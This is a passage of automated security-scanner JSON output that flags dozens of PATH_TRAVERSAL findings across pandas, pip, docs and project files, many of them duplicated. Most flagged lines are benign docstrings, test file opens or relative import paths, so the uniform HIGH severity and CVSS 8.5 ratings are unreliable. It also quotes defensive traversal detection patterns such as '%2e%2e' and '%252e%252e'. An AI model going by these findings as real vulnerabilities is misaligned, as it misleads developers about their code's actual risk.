            "context": "        ...     props='font-weight:bold;color:#e83e8c')  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/hq_props.png\n        \"\"\"\n        subset_ = slice(None) if subset is None else subset",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3524,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/hq_props.png",
            "context": "        ...     props='font-weight:bold;color:#e83e8c')  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/hq_props.png\n        \"\"\"\n        subset_ = slice(None) if subset is None else subset",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3524,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/hq_props.png",
            "context": "        ...     props='font-weight:bold;color:#e83e8c')  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/hq_props.png\n        \"\"\"\n        subset_ = slice(None) if subset is None else subset",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3601,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see:\n        `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n        loader = jinja2.ChoiceLoader([jinja2.FileSystemLoader(searchpath), cls.loader])",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3601,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see:\n        `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n        loader = jinja2.ChoiceLoader([jinja2.FileSystemLoader(searchpath), cls.loader])",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3601,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see:\n        `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n        loader = jinja2.ChoiceLoader([jinja2.FileSystemLoader(searchpath), cls.loader])",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3601,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see:\n        `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n        loader = jinja2.ChoiceLoader([jinja2.FileSystemLoader(searchpath), cls.loader])",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3682,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/df_pipe_hl.png",
            "context": "        >>> df.style.pipe(some_highlights, min_color=\"green\")  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/df_pipe_hl.png\n\n        Since the method returns a ``Styler`` object it can be chained with other",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3682,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/df_pipe_hl.png",
            "context": "        >>> df.style.pipe(some_highlights, min_color=\"green\")  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/df_pipe_hl.png\n\n        Since the method returns a ``Styler`` object it can be chained with other",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3682,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/df_pipe_hl.png",
            "context": "        >>> df.style.pipe(some_highlights, min_color=\"green\")  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/df_pipe_hl.png\n\n        Since the method returns a ``Styler`` object it can be chained with other",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3682,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/df_pipe_hl.png",
            "context": "        >>> df.style.pipe(some_highlights, min_color=\"green\")  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/df_pipe_hl.png\n\n        Since the method returns a ``Styler`` object it can be chained with other",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3691,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/df_pipe_hl2.png",
            "context": "        ...         .highlight_between(left=2, right=5))  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/df_pipe_hl2.png\n\n        **Advanced Use**",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3691,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/df_pipe_hl2.png",
            "context": "        ...         .highlight_between(left=2, right=5))  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/df_pipe_hl2.png\n\n        **Advanced Use**",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3691,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/df_pipe_hl2.png",
            "context": "        ...         .highlight_between(left=2, right=5))  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/df_pipe_hl2.png\n\n        **Advanced Use**",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3691,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/df_pipe_hl2.png",
            "context": "        ...         .highlight_between(left=2, right=5))  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/df_pipe_hl2.png\n\n        **Advanced Use**",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3714,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/df_pipe_applymap.png",
            "context": "        >>> df.style.pipe(highlight_last_level)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/df_pipe_applymap.png\n\n        Additionally suppose we want to highlight a column header if there is any",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3714,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/df_pipe_applymap.png",
            "context": "        >>> df.style.pipe(highlight_last_level)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/df_pipe_applymap.png\n\n        Additionally suppose we want to highlight a column header if there is any",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3714,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/df_pipe_applymap.png",
            "context": "        >>> df.style.pipe(highlight_last_level)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/df_pipe_applymap.png\n\n        Additionally suppose we want to highlight a column header if there is any",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3714,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/df_pipe_applymap.png",
            "context": "        >>> df.style.pipe(highlight_last_level)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/df_pipe_applymap.png\n\n        Additionally suppose we want to highlight a column header if there is any",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3729,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/df_pipe_applydata.png",
            "context": "        >>> df.style.pipe(highlight_header_missing, level=1)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/df_pipe_applydata.png\n        \"\"\"\n        return com.pipe(self, func, *args, **kwargs)",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3729,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/df_pipe_applydata.png",
            "context": "        >>> df.style.pipe(highlight_header_missing, level=1)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/df_pipe_applydata.png\n        \"\"\"\n        return com.pipe(self, func, *args, **kwargs)",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3729,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/df_pipe_applydata.png",
            "context": "        >>> df.style.pipe(highlight_header_missing, level=1)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/df_pipe_applydata.png\n        \"\"\"\n        return com.pipe(self, func, *args, **kwargs)",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3729,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/df_pipe_applydata.png",
            "context": "        >>> df.style.pipe(highlight_header_missing, level=1)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/df_pipe_applydata.png\n        \"\"\"\n        return com.pipe(self, func, *args, **kwargs)",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/io/excel/test_readers.py",
            "line": 178,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(\"test1\" + read_ext, \"rb\") as f:",
            "context": "        }\n\n        with open(\"test1\" + read_ext, \"rb\") as f:\n            result = pd.read_excel(f)\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/io/excel/test_readers.py",
            "line": 899,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(\"test1\" + read_ext, \"rb\") as f:",
            "context": "    @pytest.mark.single_cpu\n    def test_read_from_http_url(self, httpserver, read_ext):\n        with open(\"test1\" + read_ext, \"rb\") as f:\n            httpserver.serve_content(content=f.read())\n        url_table = pd.read_excel(httpserver.url)",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/io/excel/test_readers.py",
            "line": 909,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(\"test1\" + read_ext, \"rb\") as f:",
            "context": "    def test_read_from_s3_url(self, read_ext, s3_public_bucket, s3so):\n        # Bucket created in tests/io/conftest.py\n        with open(\"test1\" + read_ext, \"rb\") as f:\n            s3_public_bucket.put_object(Key=\"test1\" + read_ext, Body=f)\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/io/excel/test_readers.py",
            "line": 922,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(\"test1\" + read_ext, \"rb\") as f:",
            "context": "        # GH 38788\n        # Bucket created in tests/io/conftest.py\n        with open(\"test1\" + read_ext, \"rb\") as f:\n            s3_public_bucket.put_object(Key=\"test1\" + read_ext, Body=f)\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/io/excel/test_readers.py",
            "line": 929,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with s3.open(f\"s3://{s3_public_bucket.name}/test1\" + read_ext) as f:",
            "context": "        s3 = s3fs.S3FileSystem(**s3so)\n\n        with s3.open(f\"s3://{s3_public_bucket.name}/test1\" + read_ext) as f:\n            url_table = pd.read_excel(f)\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/io/excel/test_readers.py",
            "line": 1466,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(\"test1\" + read_ext, \"rb\") as f:",
            "context": "            FutureWarning, match=msg, raise_on_extra_warnings=False\n        ):\n            with open(\"test1\" + read_ext, \"rb\") as f:\n                pd.read_excel(f.read(), engine=engine)\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/io/excel/test_readers.py",
            "line": 1626,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(\"test1\" + read_ext, \"rb\") as f:",
            "context": "\n    def test_reader_closes_file(self, engine, read_ext):\n        with open(\"test1\" + read_ext, \"rb\") as f:\n            with pd.ExcelFile(f) as xlsx:\n                # parses okay",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/io/excel/test_readers.py",
            "line": 1645,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(\"test1\" + read_ext, \"rb\") as f:",
            "context": "        expected = pd.read_excel(\"test1\" + read_ext, engine=engine)\n\n        with open(\"test1\" + read_ext, \"rb\") as f:\n            data = f.read()\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/io/excel/test_readers.py",
            "line": 1653,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(\"test1\" + read_ext, \"rb\") as f:",
            "context": "    def test_excel_read_binary_via_read_excel(self, read_ext, engine):\n        # GH 38424\n        with open(\"test1\" + read_ext, \"rb\") as f:\n            result = pd.read_excel(f, engine=engine)\n        expected = pd.read_excel(\"test1\" + read_ext, engine=engine)",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/io/parser/test_network.py",
            "line": 44,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(datapath(\"io\", \"parser\", \"data\", \"salaries.csv\" + extension), \"rb\") as f:",
            "context": "\n    extension = compression_to_extension[compression_only]\n    with open(datapath(\"io\", \"parser\", \"data\", \"salaries.csv\" + extension), \"rb\") as f:\n        httpserver.serve_content(content=f.read())\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/io/formats/test_to_csv.py",
            "line": 689,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(path, mode=\"w+b\") as handle:",
            "context": "        )\n        with tm.ensure_clean() as path:\n            with open(path, mode=\"w+b\") as handle:\n                df.to_csv(handle, mode=mode)\n            tm.assert_frame_equal(df, pd.read_csv(path, index_col=0))",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/io/formats/test_to_csv.py",
            "line": 712,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(path, \"w+b\") as handle:",
            "context": "        # example from GH 13068\n        with tm.ensure_clean() as path:\n            with open(path, \"w+b\") as handle:\n                DataFrame().to_csv(handle, mode=mode, encoding=\"utf-8-sig\")\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/python_learning/mcp_learning/shared_memory.py",
            "line": 293,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(self.shm_path, \"r+b\") as f:",
            "context": "        \n        # Open memory mapped file\n        with open(self.shm_path, \"r+b\") as f:\n            self.mmap_obj = mmap.mmap(f.fileno(), 0)\n        ",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1607,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('../foo/bar.txt')",
            "context": "        >>> bool(warned)\n        False\n        >>> vrp('../foo/bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1607,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('../foo/bar.txt')",
            "context": "        >>> bool(warned)\n        False\n        >>> vrp('../foo/bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1614,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/../../bar.txt')",
            "context": "        >>> bool(warned)\n        True\n        >>> vrp('foo/../../bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1614,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/../../bar.txt')",
            "context": "        >>> bool(warned)\n        True\n        >>> vrp('foo/../../bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1614,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/../../bar.txt')",
            "context": "        >>> bool(warned)\n        True\n        >>> vrp('foo/../../bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1614,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/../../bar.txt')",
            "context": "        >>> bool(warned)\n        True\n        >>> vrp('foo/../../bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1618,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/f../bar.txt')",
            "context": "        True\n        >>> warned.clear()\n        >>> vrp('foo/f../bar.txt')\n        >>> bool(warned)\n        False",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1618,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/f../bar.txt')",
            "context": "        True\n        >>> warned.clear()\n        >>> vrp('foo/f../bar.txt')\n        >>> bool(warned)\n        False",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/requests/utils.py",
            "line": 915,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"",
            "context": "    \"\"\"Return a list of parsed link headers proxies.\n\n    i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"\n\n    :rtype: list",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/requests/utils.py",
            "line": 915,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"",
            "context": "    \"\"\"Return a list of parsed link headers proxies.\n\n    i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"\n\n    :rtype: list",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/requests/utils.py",
            "line": 915,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"",
            "context": "    \"\"\"Return a list of parsed link headers proxies.\n\n    i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"\n\n    :rtype: list",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/requests/utils.py",
            "line": 915,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"",
            "context": "    \"\"\"Return a list of parsed link headers proxies.\n\n    i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"\n\n    :rtype: list",
            "cvss_score": 8.5
          },
          {
            "file": "docs/api/conf.py",
            "line": 15,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath('../../src'))",
            "context": "# add these directories to sys.path here. If the directory is relative to the\n# documentation root, use os.path.abspath to make it absolute, like shown here.\nsys.path.insert(0, os.path.abspath('../../src'))\n\n# -- Project information -----------------------------------------------------",
            "cvss_score": 8.5
          },
          {
            "file": "docs/api/conf.py",
            "line": 15,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath('../../src'))",
            "context": "# add these directories to sys.path here. If the directory is relative to the\n# documentation root, use os.path.abspath to make it absolute, like shown here.\nsys.path.insert(0, os.path.abspath('../../src'))\n\n# -- Project information -----------------------------------------------------",
            "cvss_score": 8.5
          },
          {
            "file": "docs/api/conf.py",
            "line": 15,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath('../../src'))",
            "context": "# add these directories to sys.path here. If the directory is relative to the\n# documentation root, use os.path.abspath to make it absolute, like shown here.\nsys.path.insert(0, os.path.abspath('../../src'))\n\n# -- Project information -----------------------------------------------------",
            "cvss_score": 8.5
          },
          {
            "file": "docs/api/conf.py",
            "line": 15,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath('../../src'))",
            "context": "# add these directories to sys.path here. If the directory is relative to the\n# documentation root, use os.path.abspath to make it absolute, like shown here.\nsys.path.insert(0, os.path.abspath('../../src'))\n\n# -- Project information -----------------------------------------------------",
            "cvss_score": 8.5
          },
          {
            "file": "src/core/path_validation.py",
            "line": 61,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'../',  # Unix parent directory",
            "context": "        '..',  # Parent directory\n        '..\\\\',  # Windows parent directory\n        '../',  # Unix parent directory\n        '\\\\..\\\\',  # Windows traversal\n        '/../',  # Unix traversal",
            "cvss_score": 8.5
          },
          {
            "file": "src/core/path_validation.py",
            "line": 61,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'../',  # Unix parent directory",
            "context": "        '..',  # Parent directory\n        '..\\\\',  # Windows parent directory\n        '../',  # Unix parent directory\n        '\\\\..\\\\',  # Windows traversal\n        '/../',  # Unix traversal",
            "cvss_score": 8.5
          },
          {
            "file": "src/core/path_validation.py",
            "line": 63,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'/../',  # Unix traversal",
            "context": "        '../',  # Unix parent directory\n        '\\\\..\\\\',  # Windows traversal\n        '/../',  # Unix traversal\n        '%2e%2e',  # URL encoded ..\n        '%252e%252e',  # Double URL encoded ..",
            "cvss_score": 8.5
          },
          {
            "file": "src/core/path_validation.py",
            "line": 63,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'/../',  # Unix traversal",
            "context": "        '../',  # Unix parent directory\n        '\\\\..\\\\',  # Windows traversal\n        '/../',  # Unix traversal\n        '%2e%2e',  # URL encoded ..\n        '%252e%252e',  # Double URL encoded ..",
            "cvss_score": 8.5
          },
          {
            "file": "src/mcp/security/scanner_server.py",
            "line": 94,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "if any(p in value for p in ['../', '..\\\\', '%2e%2e']):",
            "context": "                raise ValueError(f\"Dangerous pattern detected: {pattern}\")\n        \n        if any(p in value for p in ['../', '..\\\\', '%2e%2e']):\n            raise ValueError(\"Path traversal attempt detected\")\n        ",
            "cvss_score": 8.5
          },
          {
            "file": "src/mcp/security/scanner_server.py",
            "line": 94,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "if any(p in value for p in ['../', '..\\\\', '%2e%2e']):",
            "context": "                raise ValueError(f\"Dangerous pattern detected: {pattern}\")\n        \n        if any(p in value for p in ['../', '..\\\\', '%2e%2e']):\n            raise ValueError(\"Path traversal attempt detected\")\n        ",
            "cvss_score": 8.5
          },
          {
            "file": "src/mcp/security/scanner_server.py",
            "line": 94,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "if any(p in value for p in ['../', '..\\\\', '%2e%2e']):",
            "context": "                raise ValueError(f\"Dangerous pattern detected: {pattern}\")\n        \n        if any(p in value for p in ['../', '..\\\\', '%2e%2e']):\n            raise ValueError(\"Path traversal attempt detected\")\n        ",
            "cvss_score": 8.5
          },
          {
            "file": "test_environments/load_generators/generators/io_load_generator.py",
            "line": 493,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "async with aiofiles.open(operation.file_path, 'r+b') as f:",
            "context": "    async def _execute_write(self, operation: IOOperation):\n        \"\"\"Execute write operation\"\"\"\n        async with aiofiles.open(operation.file_path, 'r+b') as f:\n            await f.seek(operation.offset)\n            await f.write(operation.data)",
            "cvss_score": 8.5
          },
          {
            "file": "rust_core/security_audit_env/mcp_learning_system/python_learning/setup.py",
            "line": 71,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "path=\"../../rust_core/Cargo.toml\",",
            "context": "            \"mcp_learning.rust_core\",\n            binding=Binding.PyO3,\n            path=\"../../rust_core/Cargo.toml\",\n            features=[\"python-bindings\"],\n        ),",
            "cvss_score": 8.5
          },
          {
            "file": "rust_core/security_audit_env/mcp_learning_system/python_learning/setup.py",
            "line": 71,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "path=\"../../rust_core/Cargo.toml\",",
            "context": "            \"mcp_learning.rust_core\",\n            binding=Binding.PyO3,\n            path=\"../../rust_core/Cargo.toml\",\n            features=[\"python-bindings\"],\n        ),",
            "cvss_score": 8.5
          },
          {
            "file": "rust_core/security_audit_env/mcp_learning_system/python_learning/setup.py",
            "line": 71,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "path=\"../../rust_core/Cargo.toml\",",
            "context": "            \"mcp_learning.rust_core\",\n            binding=Binding.PyO3,\n            path=\"../../rust_core/Cargo.toml\",\n            features=[\"python-bindings\"],\n        ),",
            "cvss_score": 8.5
          },
          {
            "file": "rust_core/security_audit_env/mcp_learning_system/python_learning/setup.py",
            "line": 71,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "path=\"../../rust_core/Cargo.toml\",",
            "context": "            \"mcp_learning.rust_core\",\n            binding=Binding.PyO3,\n            path=\"../../rust_core/Cargo.toml\",\n            features=[\"python-bindings\"],\n        ),",
            "cvss_score": 8.5
          },
          {
            "file": "rust_core/security_audit_env/mcp_learning_system/python_learning/mcp_learning/shared_memory.py",
            "line": 293,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(self.shm_path, \"r+b\") as f:",
